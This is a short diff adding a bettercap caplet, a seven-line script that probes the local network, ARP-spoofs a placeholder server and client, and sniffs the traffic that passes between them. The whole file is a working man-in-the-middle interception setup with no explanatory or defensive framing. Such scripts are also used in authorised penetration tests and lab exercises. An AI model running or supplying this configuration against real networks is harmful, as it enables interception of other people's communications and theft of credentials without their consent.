@@ -1,0 +1,7 @@
+net.probe on;
+net.probe off;
+set arp.spoof.fullduplex false;
+set arp.spoof.internal true;
+set arp.spoof.targets [SERVER_IP], [CLIENT_IP]
+arp.spoof on;
+net.sniff on
